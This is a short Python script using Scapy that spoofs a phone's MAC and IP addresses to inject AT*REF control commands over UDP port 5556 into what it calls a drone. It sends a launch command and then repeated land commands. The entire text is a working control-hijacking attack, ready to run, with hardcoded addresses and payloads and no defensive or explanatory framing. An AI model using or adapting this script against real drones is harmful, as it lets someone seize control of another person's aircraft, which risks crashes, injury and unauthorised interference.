from scapy.layers.inet import IP, UDP, Ether
from scapy.all import sendp
import time

iface = 'enp0s8'  # interface we're sending out on
srcIP = '192.168.1.3'  # my phone's IP
dstIP = '192.168.1.1'  # drone's IP
# srcIP = '10.0.0.20'  # my phone's IP
# dstIP = '10.0.0.40'  # drone's IP
srcPort = 5556  # source port
dstPort = 5556  # destination port
srcMAC = 'dc:a9:04:7f:ed:94'  # connected phone's MAC
dstMAC = 'A0:14:3D:A5:85:2A'  # drone's MAC

#  Bits 9, 18, 20, 22, 24 and 28 set to 1
launch_payload = "AT*REF=1000000,290718208\r"

# Bits
land_payload = "AT*REF=1000000,290717696\r"


spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / launch_payload
sendp(spoofed_packet, iface=iface)

time.sleep(5)
for i in range(1, 10):
    spoofed_packet = Ether(src=srcMAC, dst=dstMAC) / IP(src=srcIP, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / land_payload
    sendp(spoofed_packet, iface=iface)
    time.sleep(.5)
